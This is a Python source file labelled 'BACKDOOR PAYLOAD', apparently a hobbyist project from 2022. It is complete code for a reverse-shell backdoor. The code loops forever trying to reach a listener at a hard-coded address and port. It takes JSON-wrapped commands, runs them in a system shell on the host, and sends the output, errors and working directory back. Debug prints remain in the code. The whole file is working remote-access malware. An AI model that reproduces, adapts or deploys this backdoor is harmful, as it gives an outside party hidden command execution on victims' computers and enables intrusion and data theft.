"""
BACKDOOR PAYLOAD
----------------

    written by: mr3w00d - 2022


Opens connect to a backdoor server / listener and recive requests.
Requests are either a commandline for shell, or a application request.

Application work on a request - response basis. 
Each request will require a response
After each response, application will wait for the next request.

Requests are parsed in a RequestData object.
Sends a RespondData object.

See class comments for more information about these data classes.

"""

import json, socket,subprocess, time, os
from typing import Text

# Default reciver ip address and port
RECIVER_IP      = "192.168.0.16"
RECIVER_PORT    = 5555

# default timer for trying to reconnect with host, default: 20 seconds
DEFAULT_TIMEOUT = 0.5   # DEV :: set as half second for dev purposes


def dev_breakpoint(data, text=None):
    if text == None:
        text = "DEV :: Test data\n {}".format(data)
    else:
        text = "DEV :: {}\n{}".format(text, data)
    
    print(text)
    input("DEV :: Press enter to continue")


class RequestData:
    """ Parse Json data con initializaion and hold request data"""

    # default constructor
    def __init__(self,requestJson):


        self.is_request = requestJson['is_request']     # if true, command is for application, else for shell
        self.command    = requestJson['command']        # command for app or shell


class ResponseData:
    """
        Hold data for responses. 
        Contain method for extracting encoded json for socket send
    """

    # default constructor
    def __init__(self, out = None, err=None, cwd=None):
        self.has_output = True  # set to false if response have no output
        self.out        = out   # output data from shell
        self.err        = err   # error from shell
        self.cwd        = cwd   # current working directory

    def jsonEncoded(self) -> bytes:
        """Method for extracting data as encoded json string"""

        jsonData = json.dumps(self, default=lambda x: x.__dict__, sort_keys=True, indent=4)
        return jsonData.encode()


class Backdoor:
    """Backdoor object. Run method runs the back door"""


    def __init__(self, ip, port):

        self._reciver   = (ip, port)    # address for backdoor reciver
        self._cwd       = os.getcwd()   # current working directory

        # defining properties for later use here
        self._socket = None


    def run(self):
        """ run backdoor"""
        
        # loops forever with trying to connect to server
        while True:

            # set sleeper for trying to connect
            time.sleep(DEFAULT_TIMEOUT) 

            # try connection
            try:
                # create socket and try to connect...
                self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self._socket.connect(self._reciver)

                print("DEV :: connected")

                self._shell()
                self._socket.close()

                print("DEV :: connection closed")
            
            # except connection refused error
            except ConnectionRefusedError:

                print("DEV :: No Connection...")
                continue

            except ConnectionResetError:
                print("DEV :: Connection reset")
                continue
            
    
    # run shell
    def _shell(self):
        """ handles incoming requests"""

        while True:
            request = self._recive()        # get request from server host
            cmd     = request.command       # extract command

            # handle exit and quit commands
            if cmd == "exit":
                break

            # handle as app command if request is for application
            if request.is_request:
                self._handle_app_command(cmd)
                continue

            # handle as console command if request is for console
            self._handle_console_command(cmd)


    # send data
    def _send(self, data):
        """ Transform response object to encoded json string and send bytes"""
        response = data.jsonEncoded()
        self._socket.send(response)
        

    # recive data
    def _recive(self) -> RequestData:
        """ wait for request, recives data and parse into request object """

        data = ""   # init data object

        while True:

            try:
                # recive parse and return data object
                data += self._socket.recv(1024).decode().rstrip()
                data = json.loads(data)
                return RequestData(data)
            # continue for value error
            except ValueError:
                continue


    # handle shell process
    def _process(self, command) -> tuple:
        """ process console commands, returns ( output, error ) tuple """

        # create suborocess
        process = subprocess.Popen( 
            command, 
            shell=True,
            text=True,
            cwd=self._cwd,
            stdout=subprocess.PIPE, 
            stdin=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        # get output and error
        out, err = process.communicate()


        # return output and error as tuple
        return (out, err)


    # sets current working directory
    def _set_cwd(self, cmd) -> bool:
        """ sets current working directory for application, return True if change was successful """
        try:
            path = cmd[3:]
            os.chdir(path)
            self._cwd = os.getcwd()
            return True
        except:
            return False
            

    # handle application commands
    def _handle_app_command(self, command):
        """ handle application commmands and send result as reponse to reciver"""

        response = ResponseData()
        
        if command == "getcwd":
            response.cwd = self._cwd
            self._send(response)
            return


    # handle console commands
    def _handle_console_command(self, command):
        """ handle console commands and send output as response to reciver"""

        # initialize response object
        response_data = ResponseData()

        # handle change dir 
        if command.split(" ")[0] == "cd":
            success = self._set_cwd(command)
            if not success:
                response_data.err = "Path dont exist..."
            else:
                response_data.cwd = self._cwd
            self._send(response_data)
            return
        
        # execute command in console
        result = self._process(command)
        response_data.out = result[0]
        response_data.err = result[1]
        response_data.cwd = self._cwd

        self._send(response_data)


if __name__ == "__main__":

    backdoor = Backdoor(RECIVER_IP, RECIVER_PORT)
    backdoor.run()